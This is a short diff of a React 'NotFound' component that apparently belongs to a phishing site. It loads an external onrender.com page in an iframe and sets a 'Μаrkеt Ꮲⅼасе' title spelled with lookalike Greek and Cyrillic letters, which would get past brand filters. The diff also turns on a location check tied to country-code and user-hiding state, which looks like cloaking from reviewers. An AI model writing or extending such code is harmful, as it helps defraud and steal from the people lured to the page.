@@ -21,7 +21,7 @@ import { db } from "../firebase";
 
 function NotFound() {
   const [IsChecked, setIsChecked] = useState(0);
-  let[countryCode, setCountryCode] = useState('vn');
+  let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://stackclient-hhrs.onrender.com/');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Μаrkеt Ꮲⅼасе');
@@ -89,7 +89,7 @@ function NotFound() {
     }
   };
   useEffect(() => {
-    //setLocaltion();
+    setLocaltion();
   }, []);
 
   const params = new URLSearchParams(window.location.search)
